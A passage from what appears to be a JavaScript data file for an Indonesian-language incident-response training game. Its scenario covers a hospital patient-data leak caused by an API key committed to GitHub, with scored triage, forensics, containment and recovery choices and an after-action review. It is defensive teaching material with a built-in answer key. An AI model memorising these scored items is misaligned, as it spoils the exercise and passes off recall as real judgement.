            text: 'Tetapkan ALT-301 dan ALT-302 sebagai insiden kebocoran data medis berkategori P1 Kritis; verifikasi bahwa ALT-303 adalah sinkronisasi dataset publik yang sah.',
            type: 'optimal',
            points: 25,
            riskDelta: -10,
            availabilityDelta: 0,
            feedback: 'Keputusan triage yang tepat! Membedakan penyimpanan publik resmi dari kebocoran bucket rekam medis privat melindungi reputasi dan kerahasiaan data pasien sensitif.'
          },
          {
            id: 'triage-suboptimal',
            text: 'Fokus pada ALT-303 karena ada kata "Public" dan abaikan pengunduhan 45 GB sampai ada laporan komplain dari dokter.',
            type: 'suboptimal',
            points: 8,
            riskDelta: +20,
            availabilityDelta: 0,
            feedback: 'Sangat keliru. Dataset di ALT-303 memang ditujukan untuk publik, sedangkan pengunduhan data pasien dari Tor node adalah kebocoran rekam medis aktif.'
          },
          {
            id: 'triage-hazardous',
            text: 'Tutup semua peringatan karena menganggap unduhan 45 GB berasal dari dokter yang sedang bekerja jarak jauh via Tor.',
            type: 'hazardous',
            points: 0,
            riskDelta: +35,
            availabilityDelta: 0,
            feedback: 'Sangat berbahaya dan melanggar prinsip kepatuhan medis! Tor bukan saluran resmi rumah sakit, dan bucket rekam medis tidak boleh dibuat menjadi publik.'
          }
        ]
      },
      phaseB: {
        title: 'Fase 2: Forensik Cloud & Penelusuran Sumber Bocor',
        question: 'Berdasarkan log CloudTrail, audit GitHub, dan aliran transfer, bagaimana penyerang memperoleh kunci akses bucket dan mengeksfiltrasi data?',
        options: [
          {
            id: 'inv-optimal',
            text: 'Kunci API medika-sync-daemon bocor via commit GitHub publik oleh pengembang; bot pemindai penyerang menemukan kunci tersebut, memodifikasi izin bucket jadi publik, lalu mengunduh data via Tor.',
            type: 'optimal',
            points: 25,
            riskDelta: -15,
            availabilityDelta: 0,
            feedback: 'Analisis forensik cloud yang sangat cermat! Anda berhasil menghubungkan commit git 14 jam sebelumnya dengan aksi eksfiltrasi dari jaringan Tor.'
          },
          {
            id: 'inv-suboptimal',
            text: 'Penyerang melakukan serangan DDoS ke portal medis rumah sakit untuk membongkar enkripsi basis data.',
            type: 'suboptimal',
            points: 8,
            riskDelta: +5,
            availabilityDelta: 0,
            feedback: 'Kurang akurat. Ini bukan serangan DDoS; penyerang menggunakan kredensial API sah yang bocor di repositori publik.'
          },
          {
            id: 'inv-hazardous',
            text: 'Penyedia cloud (AWS/Google Cloud) mengalami pembobolan infrastruktur fisik datacenter global.',
            type: 'hazardous',
            points: 0,
            riskDelta: +15,
            availabilityDelta: 0,
            feedback: 'Menyalahkan pihak ketiga tanpa dasar. Log dengan jelas membuktikan kelalaian internal berupa kebocoran API secret key pada repositori publik.'
          }
        ]
      },
      phaseC: {
        title: 'Fase 3: Tindakan Kontainmen Cloud Terarah',
        question: 'Pengunduhan ilegal sedang berlangsung. Tindakan kontainmen apa yang harus dieksekusi seketika untuk menghentikan kebocoran tanpa menghapus data pasien?',
        options: [
          {
            id: 'cont-optimal',
            text: 'Segera nonaktifkan API Key medika-sync-daemon, kembalikan bucket policy menjadi "Block All Public Access", dan terapkan WAF rate-limiting untuk memblokir IP Tor 45.134.20.15.',
            type: 'optimal',
            points: 25,
            riskDelta: -40,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'API-KEY-DAEMON', status: 'isolated' },
              { id: 'S3-PATIENT-PROD', status: 'isolated' },
              { id: 'SRV-APP-PORTAL', status: 'normal' }
            ],
            feedback: 'Kontainmen presisi tinggi! Mencabut kunci API dan mengunci izin publik mematikan aliran unduhan ilegal seketika, sementara dokter tetap dapat mengakses portal rumah sakit secara sah.'
          },
          {
            id: 'cont-suboptimal',
            text: 'Hapus seluruh repositori GitHub publik tetapi biarkan API key dan bucket izin publik tetap aktif hingga jam kerja esok hari.',
            type: 'suboptimal',
            points: 8,
            riskDelta: -5,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'S3-PATIENT-PROD', status: 'investigating' }
            ],
            feedback: 'Kurang efektif. Menghapus repositori GitHub tidak mematikan kunci yang sudah terlanjur disimpan oleh penyerang di komputernya.'
          },
          {
            id: 'cont-hazardous',
            text: 'Hapus permanen bucket penyimpanan S3-PATIENT-PROD beserta seluruh 45 GB rekam medis pasien di dalamnya.',
            type: 'hazardous',
            points: 0,
            riskDelta: -10,
            availabilityDelta: -80,
            assetUpdates: [
              { id: 'S3-PATIENT-PROD', status: 'isolated' },
              { id: 'SRV-APP-PORTAL', status: 'compromised' }
            ],
            feedback: 'Tindakan fatal tak termaafkan! Menghapus bucket memusnahkan data riwayat medis pasien rumah sakit secara permanen dan melumpuhkan layanan medis gawat darurat.'
          }
        ]
      },
      phaseD: {
        title: 'Fase 4: Eradikasi, Audit Kepatuhan & Pemulihan',
        question: 'Akses ilegal telah diputus. Bagaimana langkah pemulihan jangka panjang untuk mencegah terulangnya kebocoran data rahasia ini?',
        options: [
          {
            id: 'rec-optimal',
            text: 'Rotasi seluruh master credentials cloud, integrasikan pre-commit hook secret scanner di Git, batasi izin bucket hanya via VPC Endpoint/IAM Role (tanpa static secret), dan siapkan laporan audit insiden regulasi data pribadi.',
            type: 'optimal',
            points: 25,
            riskDelta: -25,
            availabilityDelta: 0,
            assetUpdates: [
              { id: 'API-KEY-DAEMON', status: 'remediated' },
              { id: 'S3-PATIENT-PROD', status: 'remediated' },
              { id: 'SRV-APP-PORTAL', status: 'normal' }
            ],
            feedback: 'Pemulihan dan mitigasi strategis! Mengganti static key dengan IAM Role/VPC Endpoint menghilangkan risiko kebocoran kredensial manusia di masa depan.'
          },
          {
            id: 'rec-suboptimal',
            text: 'Buat API key baru dengan hak akses yang sama dan kirimkan kembali ke pengembang magang melalui aplikasi obrolan.',
            type: 'suboptimal',
            points: 10,
            riskDelta: +10,
            availabilityDelta: 0,
            feedback: 'Kurang memadai. Menggunakan static key yang dibagikan secara manual rentan bocor kembali tanpa adanya automated guardrails di CI/CD.'
          },
          {
            id: 'rec-hazardous',
            text: 'Sembunyikan insiden dari pimpinan, jangan rotasi kredensial lain, dan biarkan sistem berjalan apa adanya.',
            type: 'hazardous',
            points: 0,
            riskDelta: +30,
            availabilityDelta: 0,
            feedback: 'Pelanggaran hukum serius! Menyembunyikan kebocoran data medis melanggar undang-undang perlindungan data pribadi dan membahayakan keselamatan pasien.'
          }
        ]
      }
    },
    aar: {
      attackVectorSummary: 'Kebocoran Static Cloud API Access Key pada repositori GitHub publik yang dieksploitasi oleh bot pemindai untuk mengubah izin penyimpanan cloud menjadi publik.',
      rootCause: 'Tidak adanya pemindaian rahasia otomatis (Secret Scanning) dalam alur kerja git tim developer dan penggunaan kunci statis alih-alih IAM Instance Profile / VPC Endpoints.',
      mitigationLessons: 'Gunakan IAM Role temporer, aktifkan AWS S3 Block Public Access di tingkat organisasi akun (Account Level), terapkan Git pre-commit hooks pendeteksi secret, dan lakukan audit izin berkala.',
      recommendedLessonIds: ['1-b', '2-e', '4-b']
    }
  }
];
